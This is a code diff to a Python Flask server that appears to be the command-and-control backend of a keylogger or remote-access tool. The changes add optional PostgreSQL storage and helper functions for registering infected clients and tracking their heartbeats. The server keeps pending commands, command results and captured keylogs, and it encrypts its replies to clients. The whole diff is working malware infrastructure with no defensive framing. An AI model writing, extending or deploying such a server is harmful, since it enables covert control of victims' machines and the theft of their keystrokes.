@@ -10,13 +10,45 @@ from protocol import Protocol
 
 app = Flask(__name__)
 
-# In-memory storage
-clients = {}
-pending_commands = {}
-command_results = {}
-keylogs_storage = {}
+# Database configuration
+DATABASE_URL = os.getenv('DATABASE_URL')  # PostgreSQL URL from environment
+
+if DATABASE_URL:
+    print(f"[SERVER] Mode: DATABASE (PostgreSQL)")
+    from database import DatabaseManager
+    db = DatabaseManager(DATABASE_URL)
+else:
+    print(f"[SERVER] Mode: IN-MEMORY (No database)")
+    # In-memory storage
+    db = None
+    clients = {}
+    pending_commands = {}
+    command_results = {}
+    keylogs_storage = {}
 
 encryptor = Encryptor(ENCRYPTION_KEY)
+
+# Helper functions for database abstraction
+def save_client(client_id, system_info, ip_address):
+    if db:
+        return db.get_or_create_client(client_id, system_info, ip_address)
+    else:
+        clients[client_id] = {
+            'client_id': client_id,
+            'system_info': system_info,
+            'ip': ip_address,
+            'last_seen': time.time(),
+            'registered_at': time.time()
+        }
+
+def update_heartbeat(client_id):
+    if db:
+        return db.update_client_heartbeat(client_id)
+    else:
+        if client_id in clients:
+            clients[client_id]['last_seen'] = time.time()
+            return True
+        return False
 
 
 @app.route('/')
@@ -72,14 +104,8 @@ def register_client():
 
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        # Save to memory
-        clients[client_id] = {
-            'client_id': client_id,
-            'system_info': system_info,
-            'ip': client_ip,
-            'last_seen': time.time(),
-            'registered_at': time.time()
-        }
+        # Save client
+        save_client(client_id, system_info, client_ip)
         
         print(f"[+] Client registered: {client_id} from {client_ip}")
 
@@ -132,20 +158,15 @@ def heartbeat():
         client_id = heartbeat_data.get('client_id')
 
         if client_id:
-            # Update heartbeat in memory
-            if client_id in clients:
-                clients[client_id]['last_seen'] = time.time()
+            # Update heartbeat
+            if update_heartbeat(client_id):
                 res_msg = Protocol.create_success_message()
                 encrypted_response = encryptor.encrypt(res_msg)
-                return jsonify({
-                    "data": encrypted_response
-                })
+                return jsonify({"data": encrypted_response})
             else:
                 error_msg = Protocol.create_error_message("Client not found!")
                 encrypted_response = encryptor.encrypt(error_msg)
-                return jsonify({
-                    "data": encrypted_response,
-                }), 404
+                return jsonify({"data": encrypted_response}), 404
         else:
             error_msg = Protocol.create_error_message("No client_id provided!")
             encrypted_response = encryptor.encrypt(error_msg)
